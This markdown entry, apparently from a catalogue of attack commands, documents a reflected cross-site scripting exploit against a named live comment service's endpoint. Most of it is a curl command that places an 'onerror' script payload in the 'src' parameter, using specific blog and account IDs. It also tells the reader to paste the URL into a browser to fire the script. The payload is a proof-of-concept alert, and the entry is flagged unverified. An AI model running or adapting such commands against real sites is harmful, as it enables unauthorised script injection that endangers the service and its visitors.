---
id: cmd-xss-src-2024
data: >-
  curl -X GET
  "https://www.intensedebate.com/js/commentAction/?data={\"request_type\":\"0\",
  \"params\": {\"firstCall\":true, \"src\":\"0<img src=x
  onerror=alert('XSS')>\", \"blogpostid\":574575046, \"acctid\":419731,
  \"parentid\":0, \"depth\":0, \"type\":0, \"token\":\"\", \"anonName\":\"yyy\",
  \"anonEmail\":\"yyy@gmail.com\", \"anonURL\":\"\", \"userid\":undefined,
  \"token\":\"undefined\", \"mblid\":\"\", \"tweetThis\":\"F\",
  \"subscribeThis\":\"-1\", \"comment\":\"test\"}}"
tags:
  - xss
  - exploit
type: command
output: 'HTTP response reflecting the payload, triggering alert in browser'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.414Z'
verified: false
validated: true
submitted: true
---
# reflected-xss-src-payload

## Command

```bash
curl -X GET "https://www.intensedebate.com/js/commentAction/?data={\"request_type\":\"0\", \"params\": {\"firstCall\":true, \"src\":\"0<img src=x onerror=alert('XSS')>\", \"blogpostid\":574575046, \"acctid\":419731, \"parentid\":0, \"depth\":0, \"type\":0, \"token\":\"\", \"anonName\":\"yyy\", \"anonEmail\":\"yyy@gmail.com\", \"anonURL\":\"\", \"userid\":undefined, \"token\":\"undefined\", \"mblid\":\"\", \"tweetThis\":\"F\", \"subscribeThis\":\"-1\", \"comment\":\"test\"}}"
```

## Description

This command injects an XSS payload into the src parameter to exploit reflected XSS, executing JavaScript via an onerror handler when the response is rendered.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `data=...` | JSON with XSS in src | Yes |

## Examples

### Basic Usage

```bash
curl ... (full command)
```

### Browser Trigger

Paste the URL into a browser address bar.

## Expected Output

JSON response; when loaded in browser, alert('XSS') executes.

## Related

- [[procedures/Exploit-Reflected-XSS-in-Src-Parameter]]
